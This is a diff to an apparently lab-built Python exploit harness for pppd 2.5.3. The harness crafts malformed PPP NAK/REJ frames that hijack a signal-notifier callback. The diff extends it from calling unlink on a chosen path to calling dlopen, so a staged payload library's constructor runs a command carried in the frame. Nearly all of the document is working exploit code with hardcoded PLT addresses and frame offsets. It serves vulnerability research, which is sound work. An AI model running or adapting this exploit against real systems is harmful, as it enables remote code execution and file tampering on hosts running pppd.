@@ -12,8 +12,13 @@ Default callback is unlink@plt (0x40c4a0 in the pinned -no-pie 2.5.3 build).
 The attacker-chosen path names a lab sentinel file created before the frame;
 the observed side effect is its removal by the live pppd process.
 
-Grade: control exercised in a live process (rung 4).  This is a libc call, not
-a shell command, so it is NOT rung 5.
+W133 adds a dlopen@plt callback (0x40cd70): with `--signal INT` the signal
+number 2 becomes RTLD_NOW, so a pre-staged payload .so's constructor can run
+a lab-chosen command. `--expect created` checks for a new sentinel instead of
+a deletion. Defaults preserve the W132 behavior byte-for-byte.
+
+Grade of the default path: control exercised in a live process (rung 4), not
+a shell command, so NOT rung 5. The dlopen path is evaluated separately.
 """
 import argparse
 import json
@@ -33,12 +38,14 @@ LOGDIR.mkdir(exist_ok=True)
 SECRETS = Path("/run/pppd2shell-live/chap-secrets")
 
 UNLINK_PLT = 0x40C4A0
+DLOPEN_PLT = 0x40CD70
 NOTIFIER_OFF = 4
 PATH_OFF = 28
+CMD_WIRE_OFF = 96
 DUMMY_CHANNEL_OFF = 128
 
 
-def build_call_frames(callback: int, path: bytes):
+def build_call_frames(callback: int, path: bytes, cmd: bytes = b""):
     """Return (nak_frame, rej_frame, layout) for one sigreceived hijack."""
     notifier_ptr = REQCI_INP + NOTIFIER_OFF
     path_ptr = REQCI_INP + PATH_OFF
@@ -50,6 +57,10 @@ def build_call_frames(callback: int, path: bytes):
     body += struct.pack("<Q", path_ptr)      # notifier.arg
     body += b"\x00" * (PATH_OFF - len(body))
     body += path + b"\x00"
+    if cmd:
+        assert len(body) < CMD_WIRE_OFF, "path overruns the wire command slot"
+        body += b"\x00" * (CMD_WIRE_OFF - len(body))
+        body += cmd + b"\x00"
     body += b"\x00" * (256 - len(body))
     rej = rej_frame(bytes(body))
 
@@ -57,9 +68,11 @@ def build_call_frames(callback: int, path: bytes):
     layout.update({"callback": f"0x{callback:x}",
                    "notifier_ptr": f"0x{notifier_ptr:x}",
                    "path_ptr": f"0x{path_ptr:x}",
+                   "cmd_ptr": f"0x{REQCI_INP + CMD_WIRE_OFF:x}" if cmd else "",
                    "sigreceived_offset": SIGRECEIVED_OFF,
                    "force_bit": FORCE_BIT,
-                   "path": path.decode(errors="replace")})
+                   "path": path.decode(errors="replace"),
+                   "wire_cmd": cmd.decode(errors="replace")})
     return naka, rej, layout, pointers
 
 
@@ -76,17 +89,29 @@ def main() -> int:
     ap.add_argument("--marker", required=True)
     ap.add_argument("--mode", choices=("attack", "safe"), default="attack")
     ap.add_argument("--callback", default=f"0x{UNLINK_PLT:x}")
+    ap.add_argument("--signal", choices=("TERM", "INT", "HUP"), default="TERM")
+    ap.add_argument("--expect", choices=("removed", "created"), default="removed")
+    ap.add_argument("--arg-path", default=None,
+                    help="callback argument (defaults to the sentinel path)")
+    ap.add_argument("--wire-cmd", default=None,
+                    help="benign command carried in the rejected frame body")
+    ap.add_argument("--trace-exec", action="store_true",
+                    help="include openat/mmap in the strace filter")
     ap.add_argument("--strace", action="store_true",
                     help="trace unlink/execve from the target process")
     a = ap.parse_args()
     callback = int(a.callback, 0)
 
     victim = Path("/tmp") / f"pppd2shell-r5-{a.marker}-victim"
-    victim.write_text("sentinel-before\n")
-    path = str(victim).encode()
+    if a.expect == "removed":
+        victim.write_text("sentinel-before\n")
+    else:
+        victim.unlink(missing_ok=True)
+    path = str(Path(a.arg_path) if a.arg_path else victim).encode()
 
     if a.mode == "attack":
-        naka, rej, layout, pointers = build_call_frames(callback, path)
+        naka, rej, layout, pointers = build_call_frames(
+            callback, path, a.wire_cmd.encode() if a.wire_cmd else b"")
     else:
         naka, rej, layout, pointers = build_safe_nak(), None, {"mode": "safe"}, {}
     (LOGDIR / f"{a.marker}-nak.bin").write_bytes(naka)
@@ -111,9 +136,11 @@ def main() -> int:
         slave_name,
     ]
     if a.strace:
+        trace = ("trace=unlink,unlinkat,execve,openat,mmap,munmap,kill"
+                 if a.trace_exec else "trace=unlink,unlinkat,execve,kill")
         argv = ["sudo", "-n", "strace", "-f",
                 "-o", str(LOGDIR / f"{a.marker}-strace.log"),
-                "-e", "trace=unlink,unlinkat,execve,kill",
+                "-e", trace,
                 *pppd_args]
     else:
         argv = ["sudo", "-n", "env", "ASAN_OPTIONS=detect_leaks=0", *pppd_args]
@@ -148,10 +175,12 @@ def main() -> int:
         (LOGDIR / f"{a.marker}-pre-signal-gdb.txt").write_text(gdb_txt)
 
     target_pid = find_pid(a.binary, slave_name) or proc.pid
-    subprocess.run(["sudo", "-n", "kill", "-TERM", str(target_pid)], check=False)
+    subprocess.run(["sudo", "-n", "kill", f"-{a.signal}", str(target_pid)],
+                   check=False)
     after_term = drain(master, proc, 3.0)
     time.sleep(1.0)
-    side_effect = not victim.exists()
+    side_effect = (victim.exists() if a.expect == "created"
+                   else not victim.exists())
     content = victim.read_text(errors="replace") if victim.exists() else ""
 
     rc = proc.poll()
@@ -169,7 +198,8 @@ def main() -> int:
         (LOGDIR / f"{a.marker}-{name}.bin").write_bytes(bytes(blob))
     summary = {
         "marker": a.marker, "mode": a.mode, "binary": a.binary,
-        "callback": f"0x{callback:x}", "victim": str(victim),
+        "callback": f"0x{callback:x}", "signal": a.signal, "expect": a.expect,
+        "victim": str(victim),
         "side_effect_observed": side_effect,
         "victim_content_after": content,
         "process_rc": rc, "layout": layout,
